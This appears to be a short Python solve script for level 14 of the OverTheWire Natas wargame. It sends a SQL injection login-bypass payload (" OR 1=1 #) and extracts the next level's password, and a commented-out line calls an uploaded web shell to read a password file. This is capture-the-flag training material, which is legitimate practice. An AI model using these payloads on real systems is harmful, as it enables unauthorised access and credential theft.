#!/usr/bin/env python3

import requests
import re
import urllib
import base64
import binascii

username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.post(url, data = { "username": '" OR 1=1 #', "password": "sql_injection" }, auth = (username, password))
# response = requests.get(url, auth = (username, password))
# response = session.get(url + "upload/uyqhobeodo.php?c=cat /etc/natas_webpass/natas14", auth = (username, password))

content = response.text

# print(content)

print(re.findall('natas15 is (.*)<br>', content)[0])